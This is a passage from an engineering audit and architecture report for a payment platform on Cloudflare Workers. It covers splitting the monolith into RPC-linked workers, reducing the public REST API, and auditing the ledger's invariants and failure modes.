// workers/edgepay-merchant/src/index.ts
import { CoreRpc } from '@edgepay/core-rpc';
import { Hono } from 'hono';

type Env = { CORE: Service<CoreRpc>; MERCHANT_AUTH_SECRET: string; DB: never /* none! */ };

const app = new Hono<{ Bindings: Env }>();
app.use('*', requireBearerApiAuth(['read','write','admin']));   // existing middleware, moved verbatim
app.use('*', rateLimitMiddleware);

app.post('/v1/payments', requireScope('write'), idempotency, async (c) => {
  const view = await c.env.CORE.createPayment({
    ctx: signedCtx(c),                       // adds worker + HMAC + subject + scopes
    amount: c.req.valid('json').amount,
    ...
  });
  return c.json({ success: true, data: view }, 201);
});
```

The merchant worker still runs the **cheap, per-request** middleware (auth hash lookup needs D1! — see 13.6 for the auth-key cache design) — or delegates even that to core via a `authorizeKey(prefix, hash)` RPC. Option B (all auth in core) is simpler and is recommended for v1 of the split.

## 13.4 wrangler configuration (the actual decomposition)

```jsonc
// workers/edgepay-core/wrangler.jsonc
{
  "name": "edgepay-core",
  "main": "src/index.ts",
  "compatibility_date": "2026-08-28",
  "d1_databases":       [{ "binding": "DB", "database_name": "edgepay-cf", "database_id": "..." }],
  "kv_namespaces":      [{ "binding": "KV", "id": "..." }],
  "r2_buckets":         [{ "binding": "R2", "bucket_name": "edgepay-uploads" }],
  "queues":             { /* producers+consumers exactly as today */ },
  "durable_objects":    { "bindings": [{ "name": "LEDGER_DO", "class_name": "LedgerDO" }] },
  "migrations":         [{ "tag": "v1", "new_sqlite_classes": ["LedgerDO"] }],
  "workflows":          [ /* refund-reconciliation, reconciliation-sweep */ ],
  "ratelimits":         [ /* RATE_LIMIT_READ, RATE_LIMIT_WRITE */ ],
  "triggers":           { "crons": ["*/5 * * * *", "0 * * * *", "0 2 * * *"] }
  // routes: ONLY webhook edge route:
  //   route: [{ pattern: "webhook.edgepay.com/*", zone_name: "edgepay.com" }]
}

// workers/edgepay-customer/wrangler.jsonc
{
  "name": "edgepay-customer",
  "main": "src/index.ts",
  "compatibility_date": "2026-08-28",
  "services": [{ "binding": "CORE", "service": "edgepay-core" }],
  "vars": { "WORKER_NAME": "customer" },
  "assets": { "directory": "./public/assets", "binding": "ASSETS" }
  // NO d1, NO kv, NO do, NO queues. Routes: pay.<merchant domains>/*,
  // checkout.<platform>/*, invoice/*, pay/*
}

// workers/edgepay-merchant/wrangler.jsonc
{
  "name": "edgepay-merchant",
  "services": [{ "binding": "CORE", "service": "edgepay-core" }],
  "ratelimits": [ ... per-key limits stay HERE if auth stays in frontend ... ]
  // route: api.edgepay.com/*  (+ per-merchant api.<domain> via custom hostnames)
}

// workers/edgepay-admin/wrangler.jsonc
{
  "name": "edgepay-admin",
  "services": [{ "binding": "CORE", "service": "edgepay-core" }],
  "vars": { "CF_ACCESS_TEAM_DOMAIN": "...", "CF_ACCESS_AUD_TAG": "..." }
  // route: admin.edgepay.io/* — Cloudflare Access app in front
}
```

The **environment promotion story**: `wrangler.dev.jsonc` / `wrangler.staging.jsonc` become per-worker directories with a `service` binding pointing at `edgepay-core-dev` / `edgepay-core-staging` (service bindings support environments via distinct service names).

## 13.5 What moves where (file-level migration map)

```text
src/index.ts                → split: middleware stays per-frontend; exports move to core
src/controllers/checkout.ts → edgepay-customer (rendering) + core (verify/callback logic
                             moves behind CORE RPC: submitTrxForVerification,
                             handleGatewayCallback)
src/controllers/api.ts      → edgepay-merchant (thin REST → RPC adapters)
src/controllers/admin-api.ts→ edgepay-admin (thin REST → RPC adapters)
src/controllers/mobile.ts   → edgepay-merchant (v1; later edgepay-mobile) — JWT auth here
src/controllers/webhooks.ts → edgepay-core (public /webhook/:gateway stays HTTP)
src/controllers/install.ts  → edgepay-admin (wizard is an operator surface)
src/controllers/api-reference.ts → edgepay-merchant (documents the reduced REST)
src/middleware/auth.ts      → shared package (used by merchant+admin frontends)
src/middleware/cloudflare-access.ts → edgepay-admin only
src/middleware/domain.ts    → edgepay-customer (checkout domains) + merchant (api domains)
src/middleware/idempotency.ts → core-side (see 13.7 — reservation design fixes P1-001)
src/middleware/rate-limit.ts → frontends (per-surface groups) + core (provider webhook)
src/services/*              → edgepay-core (all)
src/do/ledger-do.ts         → edgepay-core
src/workflows/*             → edgepay-core
src/queues/*                → edgepay-core
src/cron/handler.ts         → edgepay-core
src/gateways/*              → edgepay-core (secrets only ever live here)
src/lib/*                   → shared package (money, crypto, validation, error)
src/config/platform.ts      → edgepay-core (bootstrap config)
```

## 13.6 Authentication design for the split (three options, one recommendation)

| Option | How | Pros | Cons | Verdict |
|---|---|---|---|---|
| A — Auth in each frontend | frontends keep requireBearerApiAuth (needs D1 read for key hash → give frontends a **read-only D1 clone**? D1 has no read-only users) | familiar | leaks DB binding to frontends (defeats G1) | ✗ |
| B — Auth via RPC | frontends forward the bearer key (or its prefix+hash) to core `authorizeKey()`; core returns principal+scopes; frontend caches in per-isolate LRU (60s) | zero DB bindings in frontends; one auth implementation | +1 RPC hop on cache miss (~ms) | **✓ recommended** |
| C — JWT-per-request issued by core | core issues short-lived worker-scoped JWTs; frontends verify locally with shared secret | no per-request RPC | token plumbing; complexity | v2 option |

Under option B the flow is:

```text
merchant worker                     core
     │ POST /v1/payments + Bearer op_live_…
     ├─ LRU(subject=prefix) miss ──▶ authorizeKey(prefix, sha256(key))
     │                               ── principal, scopes, merchantId, status
     │◀──────────────────────────────┘
     ├─ scope check (write) locally, rate-limit by key id
     └─ CORE.createPayment({ ctx: signed(principal) })
          └─ authorize() re-verifies HMAC + scope (defense-in-depth, G6)
```

## 13.7 Fixes that the split should carry with it (do them during the move)

1. **Idempotency reservation (closes P1-001's race):** move the middleware into core and insert the `(merchant_id, key, status='pending', lease_until)` row **before** processing; concurrent same-key requests hit the UNIQUE and receive 409/`in_flight` until the lease resolves. The `op_idempotency_keys` table gains a `status` column (migration 0005).
2. **Platform scope (closes P1-005):** add scope literal `'platform'`; `provisionMerchant`/`listMerchants` require it; only keys whose merchant `is_platform = 1` can hold it; provisioning responses stop returning raw credentials (NEW-P2-004).
3. **SSRF resolver (closes P1-004):** outbound webhooks live only in core; add `redirect: 'error'`, IP canonicalization, and (v2) an egress Worker.
4. **Body caps + per-surface limiters (P1-003, P1-010, NEW-P1-002):** mount `perIpRateLimit('otp')` / `('password')` / a new `('checkout')` group on the respective frontend workers during the move.
5. **CSP nonces on customer worker (P0-006 residual):** the checkout template moves with a nonce-based CSP (the inline script becomes a static asset — no more `unsafe-inline`).

## 13.8 Phased migration plan (zero-downtime, reversible at every phase)

```text
PHASE 0 (prep, ~1 day)
  - Extract packages/shared (lib/, middleware/auth, types) — no behavior change.
  - Add WORKER_AUTH secrets to the monolith (unused yet).
  - CI: secret scanner + eslint flat config + per-worker wrangler dry-runs.

PHASE 1 (core extraction, ~3-5 days)
  - Create edgepay-core: move services/, do/, workflows/, queues/, cron/,
    gateways/, controllers/webhooks.ts; add RcpCore with a MINIMAL surface
    (health + authorizeKey only).
  - Monolith gains a service binding CORE → but keeps its own logic
    (no behavior change yet). Deploy. Verify /webhook ingress now served by
    core's route (monolith's /webhook deleted in the same deploy).
  - Rollback: redeploy monolith with /webhook re-enabled.

PHASE 2 (customer worker, ~2-3 days)
  - edgepay-customer serves /checkout|/invoice|/pay on a dedicated route
    (pay.<domain>). The monolith keeps the old paths for one release.
    Checkout token lookup moves behind CORE.getCheckoutView /
    submitTrxForVerification / handleGatewayCallback.
  - Cutover by route: move the zone route pattern from monolith to
    customer worker. DNS/Custom Hostnames: per-merchant checkout domains
    re-point (custom-hostnames.ts already manages this — extend it to emit
    routes for the customer worker).
  - Rollback: flip the route back.

PHASE 3 (merchant worker, ~3-4 days)
  - edgepay-merchant on api.<domain>: thin controllers calling CORE RPC
    (option B auth). The reduced REST surface from §14 goes live here.
  - Monolith /api/v1/* kept in shadow (deprecated) for one release; clients
    migrate; then the monolith routes are deleted.
  - The idempotency reservation lands HERE (core-side).

PHASE 4 (admin worker, ~2 days)
  - edgepay-admin on admin.<domain> behind Cloudflare Access
    (accessAuthMiddleware moves here; bearer keys go through
    CORE.authorizeKey + 'platform' scope for tenant ops).
  - /install wizard moves here; bootstrap-key gets the 'password' limiter
    and a D1-backed install lock (migration 0005).

PHASE 5 (cleanup, ~1 day)
  - Delete the monolith (it now serves nothing).
  - Delete CSRF dead code, LedgerService.reverse, dead limiter groups —
    the "guard exists, wiring absent" class disappears with the move.
```

**Effort estimate: 2-3 engineer-weeks total**, dominated by Phase 1/3. Every phase is independently deployable and reversible via route flips; the D1/DO/KV data plane never migrates (it was always going to stay in core).

## 13.9 Failure modes of the split (and mitigations)

| Failure | Effect | Mitigation |
|---|---|---|
| Core binding call fails (core redeploy) | frontends 503 their data operations | RPC calls wrapped with retry(1) + circuit breaker per isolate; `/internal/health` checked by uptime monitor; frontends serve cached static shells |
| Core overload | all surfaces degrade together (they share core) | per-binding concurrency limits; frontends fail *closed* for mutations, open for cached reads; RATE_LIMIT_* already in core |
| HMAC secret leak | a frontend can impersonate another frontend | secrets are per-worker and rotatable; core logs `ctx.worker` + CF-Worker mismatch as a page-level alarm |
| Version skew between frontends and core (RPC interface drift) | TypeError at runtime on deploy skew | shared `@edgepay/core-rpc` package with a required `interfaceVersion` field in every context; core rejects mismatches (fail closed) |
| RPC method added, old core deployed | frontend calls missing method → exception | deploy core BEFORE frontends (additive-only interface rule between releases); CI checks interface satisfaction both directions |

---

# 14. API-SURFACE REDUCTION TO A CUSTOMER-FACING REST SYSTEM

## 14.1 Current surface inventory (67 routes on one origin)

| Group | Routes | Auth | Verdict under the target model |
|---|---|---|---|
| Install wizard | GET/POST /install, POST /install/bootstrap-key (3) | anonymous | **move to admin worker (operator surface), behind Access + 'password' limiter** |
| Merchant REST | POST /payments, GET /payments/:id, GET /transactions, GET /transactions/:trx, POST /refunds, GET /customers, GET/POST /api-keys, GET/POST/DELETE /webhooks(+tests,deliveries), GET /gateways (15) | bearer key | **KEEP — this becomes the reduced customer-facing REST API (after pruning)** |
| Mobile companion | pair/refresh/heartbeat/dashboard/sms/batch/notifications/ack (13) | JWT | **KEEP (separate /api/mobile/v1 prefix on merchant worker v1; own worker later)** |
| Admin API | 14 routes incl. merchants list/provision, reconcile, trial-balance | Access+admin key | **REMOVE from public REST — becomes admin-worker-only, RPC-backed, platform-scoped** |
| Checkout | 7 routes (page, initiate, verify, submit-trx, callback, status) | token | **KEEP on customer worker (HTML + minimal JSON)** |
| Provider webhooks | POST /webhook/:gateway (1) | HMAC | **KEEP on core (provider ingress must be HTTP)** |
| API reference | 2 routes | public | **KEEP on merchant worker** |
| Health | 1 | public | keep |

## 14.2 The reduced customer-facing REST contract

The principle: **the public REST surface is exactly what an integrating merchant or a paying customer needs — nothing more.** Everything operational moves behind RPC or the Access-gated admin worker.

```text
PUBLIC REST (api.<merchant-or-platform-domain>)

  POST   /v1/payments                 (write scope, idempotency required)
  GET    /v1/payments/{id}
  GET    /v1/transactions?limit&offset&status
  GET    /v1/transactions/{trx_id}
  POST   /v1/refunds                  (write scope, idempotency required)
  GET    /v1/refunds/{id}                                  ← NEW (readback)
  GET    /v1/gateways                 (catalog for this deployment)
  GET    /v1/webhooks                 (read)
  POST   /v1/webhooks                 (write scope — after SSRF fix)
  DELETE /v1/webhooks/{id}            (write scope)
  POST   /v1/webhooks/{id}/test       (write scope)
  GET    /v1/health, /v1/openapi.json, /v1/reference (docs)

REMOVED from public REST (→ admin worker / RPC only):
  /api/v1/customers        → merchant dashboard reads it via admin-worker RPC
                             (PII endpoint has no integration use-case;
                             remove rather than maintain)
  /api/v1/api-keys GET/POST → self-service key management moves to the
                             merchant dashboard (admin worker) — key
                             issuance via RPC, one-time display
  /api/admin/v1/* (all 14) → admin worker only, platform-scoped RPC
  /install/*               → admin worker wizard (first-run only)
  /api/v1/webhooks/deliveries → dashboard (admin worker) — operational data
```

Net public REST: **15 → 13 merchant-facing routes + 7 token-bound customer checkout routes + 1 provider webhook ingress.** Every removed route was either an operational/datasource surface (deliveries, customers, api-keys) or a privilege boundary hazard (admin, install).

## 14.3 Why "customer-facing REST only" is the right reduction

1. **Every public route is a forever-promise.** The OpenAPI document pins behavior; each route removed before scale is a route that never needs deprecation handling, WAF tuning, or per-route rate-limit policy.
2. **The integration audience is merchants' backends** — they need create/query/refund and webhook configuration. That's the 13-route contract. Operational surfaces (key management, delivery logs, provisioning) serve *humans*, who get the Access-gated dashboards.
3. **Scope semantics become trivially explainable**: `read` = GETs; `write` = POST/DELETE; `admin` = key management (dashboard only); `platform` = tenant provisioning (admin worker only). Today's P1-008 gaps become structurally impossible when mutation routes *require* write scope at the frontend router level — one `app.post('*', requireScope('write'))` default.

## 14.4 Versioning the reduced surface

- The new mount point is `/v1/*` (not `/api/v1/*`) on the merchant worker — a clean break that lets the old monolith surface run in shadow during Phase 3 and be deleted after.
- OpenAPI stays the single source of truth (`src/openapi.ts` moves to the merchant worker and is pruned to the 13 routes; the removed routes are marked `deprecated: true` in one final `/api/v1` release note).

---

# 15. CLOUDFLARE SERVICE BINDINGS & WORKER RPC — DETAILED EVALUATION & COMPARISON

The commissioning question: *is Cloudflare Service Binding / Worker RPC the appropriate mechanism for the frontend↔core integration, and if so, with what detailed design?*

## 15.1 What Service Bindings + Worker RPC actually are (2026 state)

```text
Service Binding:  an account-scoped, private reference from Worker A to
                  Worker B. Requests through the binding never traverse
                  the public internet, are not billable as requests to B,
                  and cannot be reached by anyone without the binding.

Worker RPC:       the binding's fetch target can be a class implementing
                  typed methods (extends RpcTarget or the default export's
                  rpc()). Callers do:  env.CORE.someMethod(args)
                  → near-native serialization of args/results (structured
                  clone), exceptions propagate as real errors, no HTTP
                  status-code mapping, no JSON envelope design needed.

Limits (current): 1,000 subrequests per invocation (paid); RPC calls count
                  as subrequests; no streaming of large payloads via RPC
                  (use fetch-style binding for big bodies); each RPC arg
                  must be structured-cloneable (no functions/classes).
```

## 15.2 The comparison (six realistic options)

| Criterion | **A. Service Binding + Worker RPC** | B. Service Binding + fetch() | C. Inter-worker HTTP over public routes | D. Keep monolith + tighten middleware | E. Durable Object RPC as the "core" | F. Cloudflare API Gateway / routes layer |
|---|---|---|---|---|---|---|
| Network isolation | **Private, account-scoped; zero public exposure of core** | Private (same) | Public — core routes must exist on an internet-reachable hostname; auth = shared secrets/JWTs | None — one process | Private (bindings), but DOs are per-tenant state, not request/response services | Public (gateway fronting routes) |
| Latency (frontend→core) | **~sub-millisecond (same-PoP in-process hop; Smart Placement keeps core near D1)** | + HTTP framing ≈ 1-3ms + serialization | Full TLS+DNS round trip (5-50ms cross-PoP) | 0 (in-process) | Same as A | Gateway adds 1-3ms |
| Type safety | **Shared TS interface; compile-time check on both sides** | None (hand-rolled envelopes) | None + REST contract design burden | Native (direct imports) | Typed via generated stubs, but per-DO granularity is wrong for cross-tenant ops | None |
| AuthZ boundary quality | **Core re-verifies caller via per-worker HMAC + principal reload (G6)** — and binding itself is a capability | Same possible, but easier to skip ( temptation to treat binding as enough) | Must invent request signing; risk of replay/forge | Middleware only — no network boundary (current P1-005 lesson) | DO would need its own authn — awkward | Gateway auth is coarse (API keys), no per-scope logic |
| Cost | **RPC calls are subrequests, not billed requests; no egress** | Same | Core worker invocations are **billed requests** (doubles request cost) | Cheapest | DO requests billed per 1M (currently the ledger already pays this) | Gateway is a paid product |
| Failure semantics | **Real exceptions propagate; timeouts via ctx; circuit breakers in-process** | HTTP status mapping | Network failures + retries + idempotency required | In-process throw | DO input-gate semantics (single-writer!) — wrong for fan-out request serving | Gateway-specific |
| Deploy independence | **Workers deploy independently; interface version field guards skew** | Same | Same | One deploy for everything (current pain) | DO class migrations are heavier (SQLite class migrations) | n/a |
| Fits G1-G6 goals | **All six** | G1-G5 (G6 easier to neglect) | G3-G5 only; G1/G2 weakened | G3 only; G1/G2/G6 fail (this is today's architecture and today's P1-005) | Wrong decomposition axis (tenant-sharded state, not privilege) | Orthogonal (edge concern) |
| Verdict | **RECOMMENDED** | Acceptable fallback for large-payload or streaming calls | Not recommended | Not recommended (status quo that produced the findings) | Not applicable as core API | Complementary, not alternative |

### 15.2.1 Why B (binding + fetch) is kept as a *complement*, not the primary

RPC cannot stream bodies or take a `Request` object; the checkout callback passthrough (query params of arbitrary size), the OpenAPI document, and any future file upload (R2) are better as `env.CORE.fetch()` through the same binding to core's internal routes. **Design: RPC for typed operations; fetch-through-binding for payload-shaped operations.** Both share the same private network property, so G1/G2 hold for both.

### 15.2.2 Why E (DO as the core API) fails the shape test

The repo's LedgerDO is *exactly* right as a DO: single-writer, per-tenant, stateful. A "core API" is the opposite: multi-tenant, fan-out, stateless request routing. Putting the merchant-facing API on DOs would serialize all merchants behind per-object input gates and multiply DO request billing. DO RPC is for *state* access; Worker RPC is for *service* access. The blueprint keeps DOs inside core, reached by core code only.

### 15.2.3 Why F (API Gateway) is complementary

Cloudflare's gateway/WAF layer is where per-hostname coarse policy belongs (the wrangler comments already recommend per-route edge rate rules). It sits *in front of* the three frontend workers; it does not provide the frontend↔core trust boundary, which is the binding's job. Use both: edge rules for volumetric abuse; bindings for privilege.

## 15.3 Worker RPC detailed design decisions (the "recommendation with detail")

```text
DECISION 1 — RPC surface shape
  One class (RcpCore) implementing the shared CoreRpc interface on the
  default export's rpc() entry. Methods are grouped by audience (customer /
  merchant / admin / health) but live on ONE class: a single place to put
  cross-cutting authorize(), metrics, and interfaceVersion checks.

DECISION 2 — Context authentication (G6)
  Every method takes CallerContext { worker, merchantId, subject, scopes,
  requestId, sig, interfaceVersion } where sig = HMAC-SHA256(worker secret,
  canonical(context minus sig)). Core: timing-safe verify → reload
  principal from D1 → scope check → 'platform' checks is_platform.
  NEVER trust scopes/merchantId from the wire without the reload.

DECISION 3 — Error contract
  Core throws typed errors (RpcAuthError, RpcValidationError,
  RpcConflictError...). Worker RPC propagates exceptions as real objects
  across the boundary (classes survive via their names); frontends map
  them to the existing JSON error envelope (lib/error.ts unchanged for
  REST clients).

DECISION 4 — Idempotency reservation moves to core (fixes P1-001)
  createPayment/createRefund first INSERT ... ON CONFLICT into
  op_idempotency_keys (status 'in_flight', lease 30s); the UNIQUE row is
  the mutex; second caller gets 409 IN_FLIGHT or replays the stored
  response when status='done'.

DECISION 5 — Rate limiting placement
  Per-IP groups: frontends (each mounts its own). Per-key limits:
  merchant worker at the router (key id known after authorizeKey RPC);
  core additionally enforces a coarse per-worker ceiling as a backstop.

DECISION 6 — Observability
  requestId flows: frontend generates (hono/request-id) → CallerContext →
  core logs/metrics carry it. Core emits metric() via the (now-enabled)
  ANALYTICS binding; frontends emit their own. One trace id per request
  across all four workers.

DECISION 7 — Versioning
  interfaceVersion: number in every context; core rejects majors that
  don't match (fail closed). Additive-only changes within a version;
  breaking changes bump the version and deploy core dual-accepting both
  for one release.

DECISION 8 — Payload shapes
  Args/results are plain structured-cloneable objects (the CoreRpc types).
  Large/binary/streaming payloads use binding fetch() to core's internal
  routes with the same HMAC header scheme.

DECISION 9 — Testing
  The shared interface makes core mockable: frontends get unit tests with
  an in-memory CoreRpc stub; core gets tests against the real services.
  The existing @cloudflare/vitest-plugin boots workerd per worker; add a
  cross-worker integration test using miniflare's service-binding wiring
  (two workers, one binding — supported by the plugin's helper).
```

## 15.4 Where the split pays off specifically for THIS codebase's findings

| Open finding | How the four-worker split closes or shrinks it |
|---|---|
| P1-005 escalation | `provisionMerchant` requires `'platform'` scope + `is_platform` merchant, enforced in core behind a binding the customer/merchant workers don't even have a route to |
| P1-004 SSRF | outbound fetch code exists only in core; core is not internet-routed for merchant traffic; redirect: 'error' + canonicalization during the move |
| P1-008 scope gaps | frontend router defaults (`POST*` → requireScope('write')) make read-only mutation structurally impossible |
| P1-002/NEW-P1-002 | per-surface limiter mounting is the natural unit of work in each worker's index.ts; the dead-config pattern disappears when each worker owns its groups |
| P0-001 blast radius | a leaked customer-worker artifact contains zero data-plane credentials |
| P2-006 observability | enabling ANALYTICS is a core-only decision with a single place to fail loudly |
| checkout CSP residual | customer worker ships the template as static assets + nonce'd inline → unsafe-inline eliminated |
| deploy risk | gateway/checkout changes stop shipping the ledger |

## 15.5 When NOT to do the split (honest counter-case)

- If EDGEpay stays **single-tenant self-hosted** (the deploy-button audience), the split adds 3 packages and 4 deploys for isolation one tenant doesn't need — the Phase 0/1-only variant (core + customer worker) captures 80% of the value.
- If the team cannot staff the 2-3 week migration window, the §2.3 hotfix list delivers production readiness **without** the split; do that first regardless.
- If per-merchant custom hostnames with per-merchant workers were the goal (extreme isolation), service bindings still work, but the operational surface explodes (N workers); D1 tenancy + per-merchant LedgerDO is the right tenant boundary — the four-worker split is a *privilege* boundary, not a tenant boundary. Don't confuse the two axes.

**Final recommendation: proceed with the four-worker split via Service Bindings + Worker RPC, exactly per §13, after (not before) the §2.3 hotfix list. Worker RPC is the appropriate mechanism — private, typed, cheap, and it converts today's "middleware-only" privilege boundaries into network-and-capability boundaries; fetch-through-binding for payload-shaped calls; DO RPC stays where it already is (inside core, for the ledger).**

---

# PART V — FINANCIAL & SECURITY DEEP-DIVE

---

# 16. Payment & Ledger State Machine (Reconstructed from Code)

## 16.1 op_payment_intents

```text
pending ──(createIntent)──────────────────────────── the only entry state
   │
   ├─(customer submits TrxID: checkout verify)──▶ processing (metadata
   │                                              customer_trx_id/phone)
   ├─(gateway initiate: executePayment)────────▶ processing (gateway_id set)
   ├─(expiry cron, guarded)───────────────────▶ expired   [terminal]
   ├─(callback verify fails, guarded)──────────▶ failed    [terminal-ish]
   └─(ledger posts + D1 batch)────────────────▶ completed [intended terminal]
        ⚠ unguarded UPDATE: expired → completed possible via late
          callback/SMS (P1-006 residual)
```

## 16.2 op_transactions

```text
pending → processing → awaiting_verification → completed
   │           │                                   ▲
   │           └──(callback fail, guarded)──▶ failed│(SMS corroboration /
   └──(expiry cascade)──────────────────▶ expired  │ webhook / callback / verify)
```

Superset states in the CHECK/type union that are never written: `callback_processing`, `pending_review`, `disputed`, `refunded` (P3-001).

## 16.3 Transition table (who/what/where)

| Transition | Trigger | Guard | DB op | External effect | Retry-safe |
|---|---|---|---|---|---|
| pending→processing | checkout verify / initiate | token lookup | UPDATE intents/txs (batch) | none | yes (idempotent by metadata) |
| →awaiting_verification | verify w/o SMS match | TRX_ALREADY_USED check | UPDATE tx | none | yes |
| →failed | callback verify fail | `status IN (pending, processing, created)` | UPDATE tx | none | yes |
| →expired | cron | `status IN (pending, processing) AND expires_at < now` | UPDATE both | none | yes |
| →completed | completeTransaction | **none** ⚠ | ledger post (await) + D1 batch | webhook dispatch | ledger idempotent; batch unguarded (P1-006) |
| refund pending→completed | workflow finalize | gateway 'completed' | postRefundLedgerEntry + UPDATE guarded | refund webhook | yes (tx_id dedup + WHERE guards) |
| refund pending→failed | workflow | gateway 'failed' | UPDATE guarded | page() | yes |

## 16.4 The single money-moment

All completions funnel through **one** function (`completeTransaction`) and post through **one** ledger entry point (`postPaymentLedgerEntry`, keyed `m{merchant}:payment:{intentId}`), with the DO deduping by tx_id. This is the v0.3.0 redesign's core achievement: the four completion sources (redirect callback, inbound webhook, SMS corroboration, customer verify) all converge on the same idempotent posting.

---

# 17. Ledger Invariants & Posting Protocol Audit

## 17.1 The protocol (as implemented in LedgerDO + ledger-audit.ts)

```text
A. shape validation (pure):
     Σdebits == Σcredits; positive safe-integer minor units;
     amount ≤ 90,000,000 major; known account codes; currency == chart
B. tx_id dedup:        posted_transactions PK — replay → {duplicate}
C. balance guard:      per-account normal-side balance ≥ 0 (INSUFFICIENT_FUNDS)
D. D1 write-ahead:     op_ledger_postings (pending | posted | rejected)
     ON CONFLICT(tx_id) DO NOTHING; prior='rejected' → poison guard
E. DO journal+balances (SQLite, INTEGER minor units)
F. D1 audit trail + postings→posted (single batch, idempotent statements)
   + DO alarm snapshots (daily) into op_ledger_balance_snapshots
```

All inside `blockConcurrencyWhile` (single writer per merchant). The DO **never throws** across the boundary — failures are structured results (this was empirically validated: a throw breaks the input gate).

## 17.2 Invariant audit

| Invariant (brief §12) | Enforced where | Verdict |
|---|---|---|
| No unauthorized money creation | shape validation + balance guard + tx_id dedup | **Holds** — every posting is balanced and bounded; creation paths (payment completion, refund reversal, future adjustments) all route through `LedgerService.post` |
| No unauthorized money destruction | same (a "destruction" would be an unbalanced entry) | **Holds** |
| No double posting | DO tx_id dedup (`m{m}:payment:{intent}`, `m{m}:refund:{id}`) | **Holds** — verified by ledger-consistency tests (20 same-tx_id concurrent → 1 posted) |
| No double refund | refund bounds (code) + reversal tx_id dedup | **Holds sequentially; raceable concurrently** (NEW-P2-001) |
| No invalid balance | balance guard (C) | **Holds** on normal side; clearing can legitimately debit-positive |
| No cross-tenant ledger access | DO resolved by `merchant-{id}`; D1 predicates merchant-scoped | **Holds by construction**; DO self-check absent (P2-012) |
| No terminal-state downgrade | ledger status flips guarded (`WHERE status='posted'`) | **Holds** in the ledger; payment rows less so (P1-006) |
| No duplicate external settlement | gateway calls: initiate (once per intent by design), refund (adapter.refund at creation; workflow only *queries* status) | **Holds for refunds** (query-only polling); callbacks execute but are gateway-side idempotent by paymentID |
| Σdebits == Σcredits (trial balance) | DO `trialBalance()` (INTEGER aggregation) | **Holds** — test-verified incl. crash injection |
| Balanced-but-wrong (brief §12 trap) | amount binding at completion (P0-004), corroboration amount gate (P0-007) | **Holds when adapters echo amounts** (NEW-P2-003 conditional) |

## 17.3 Posting-protocol failure matrix (verified against ledger-do tests)

| Crash point | State after crash | Recoverable? | Mechanism | Tested? |
|---|---|---|---|---|
| before D | nothing anywhere | trivially (retry) | — | n/a |
| during D (D1 pending write fails) | nothing written | yes, clean retry | insert throws → caller retries | ✅ test "D fails" |
| after D, before E | D1 pending row; DO clean | yes | replay via reconciliation | ✅ test "E fails" |
| during E (DO writes fail) | D1 pending; DO clean | yes | replay | ✅ |
| after E, before F | D1 pending + DO committed | yes — heal path returns duplicate + rewrites audit trail | reconciliation replay | ✅ "heal path" test |
| during F (batch partial) | pending + partial audit rows | yes — batch statements idempotent | replay completes | ✅ |
| deterministic validation failure | row marked 'rejected' | poison guard refuses resurrection | status check at D | ✅ "quarantines" test |

This is a genuinely well-engineered write-ahead/replay protocol — the strongest subsystem in the codebase.

## 17.4 Serialization boundary summary

The per-merchant DO serializes: posting (checks+writes), balance queries, trial balance, snapshots. It does **not** serialize: D1 payment-row status writes, refund-bound checks (NEW-P2-001), idempotency-key inserts (P1-001) — those live in D1 statement-land where SQLite's per-database write serialization helps only per-statement, not across check+insert sequences.

---

# 18. Financial Invariant Table (brief §30 format)

| Invariant | Where enforced | DB constraint | Code guard | Test | Failure behavior | Verdict |
|---|---|---|---|---|---|---|
| no double spend (ledger) | LedgerDO B | tx_id PK (DO SQLite) | dedup check | ledger-do/consistency | duplicate returned, no write | PASS |
| no double posting | LedgerDO B + posting WAL | PK + ON CONFLICT | yes | ✅ | same | PASS |
| no duplicate refund | refund.ts + workflow | — ⚠ | cumulative bound + tx_id | partial (no race test) | over-refund possible under race | CONDITIONAL |
| tenant isolation (queries) | all controllers | — | merchant_id predicates | tenant-routing tests | 403/404 | PASS (exceptions: P1-005, P3-003, P2-004) |
| idempotency | middleware + D1 | UNIQUE(merchant,key) | reservation absent ⚠ | partial | concurrent double-exec | CONDITIONAL |
| balance correctness | LedgerDO C | — | normal-side guard | ✅ | INSUFFICIENT_FUNDS | PASS |
| trial balance | DO trialBalance | — | integer aggregation | ✅ | balanced flag | PASS |
| terminal state (ledger) | status flips | CHECK | WHERE guards | ✅ | no downgrade | PASS |
| provider txn uniqueness | op_transactions.trx_id | UNIQUE | TRX_ALREADY_USED check | ✅ (dedup test) | 409 | PASS |
| payment amount integrity | entry regex + handleCallback | — | regex + (conditional) amount cmp | partial | amount_mismatch / skip ⚠ | CONDITIONAL |
| currency integrity | zod ISO-4217 + chart currency | — | DO currency check | ✅ | rejection | PASS (exponent latent P2-019) |
| reconciliation correctness | sweep workflow + runs table | — | replay + verify + drift page | ✅ | drift pages | PASS (platform merchant excluded P2-003) |

---

# 19. Failure-State Matrix (brief §31 format)

| Operation | Failure point | Resulting state | Financial risk | Recovery | Tested? |
|---|---|---|---|---|---|
| payment completion | D1 pending write fails | nothing written | none | retry | ✅ |
| payment completion | DO writes fail | pending row, DO clean | none (no completion claimed) | reconciliation replay | ✅ |
| payment completion | D1 audit batch fails | DO committed, D1 pending | books temporarily behind; intent still 'processing' | replay heals ledger; **payment row stays 'processing' (P1-006)** | ✅ ledger / ✗ payment row |
| payment completion | worker crash after ledger, before status batch | ledger posted, tx 'processing' | none financially; reporting wrong | **none automatic** ⚠ | ✗ |
| payment completion | webhook dispatch crash | completed, no merchant webhook | merchant uninformed (reconciliation of *deliveries* absent) | **none — no outbox (P2-007)** | ✗ |
| refund creation | gateway refund call fails | pending refund row + page() | over-state (refund tracked but not executed) | workflow polls → failed | ✅ |
| refund finalize | ledger reversal fails | refund pending, no reversal | books overstate revenue | step retries (3) then instance errored → DLQ page | ✅ policy tests |
| refund workflow | 24h poll exhaustion | instance errored, refund pending | stuck refund, alarm | manual (page REFUND_STUCK) | ✅ |
| callback | gateway timeout (execute) | tx stays prior status | unknown outcome — adapter returns failed → tx failed ⚠ (a timeout≠failure financially; here execute-failure means not-completed at bKash — acceptable) | SMS/webhook path can still complete | partial |
| inbound webhook | duplicate delivery, provider id present | duplicate event detected | none | 200 duplicate | ✅ |
| inbound webhook | duplicate delivery, no id | random event_id → reprocessed | completion no-ops (ledger dedup); metrics double | structural (P1-003) | ✗ |
| queue consumer crash | batch retried | at-least-once redelivery | webhook re-POST (merchant sees dup) — signature-stable; delivery idempotency absent | bounded retries + DLQ | ✗ |
| SMS corroboration | wrong amount | manual_review | none | operator queue | ✅ |
| D1 outage | all writes fail | 500s everywhere | none committed | Cloudflare D1 SLA; no local retry storm (fetch-level) | n/a |
